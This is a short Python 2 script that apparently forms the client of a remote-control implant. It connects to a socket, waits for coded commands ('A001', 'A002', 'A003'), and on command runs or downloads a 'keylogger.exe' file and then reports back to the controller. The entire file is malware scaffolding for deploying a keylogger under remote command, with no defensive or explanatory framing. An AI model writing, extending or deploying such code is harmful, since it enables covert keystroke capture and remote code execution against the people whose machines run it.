import os
import socket
import subprocess
import urllib

def download_module(url_module):
    destination = url_module.rsplit('/',1)[1]
    urllib.urlretrieve(url_module, destination)
    return 1

HOST = "localhost" # localhost
PORT = 48526

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST,PORT))
command = sock.recv(1024)

if command == "A001":
    PIPE = subprocess.PIPE
    p = subprocess.Popen([r'keylogger.exe', r'/?'], stdout=subprocess.PIPE)
    sock.send("1111")

if command == "A002":   
    sock.send("1111")

if command == "A003":
    url_module = "file:///X:/keylogger.exe"
    check = download_module(url_module)
    sock.send("1111")

sock.close()
print command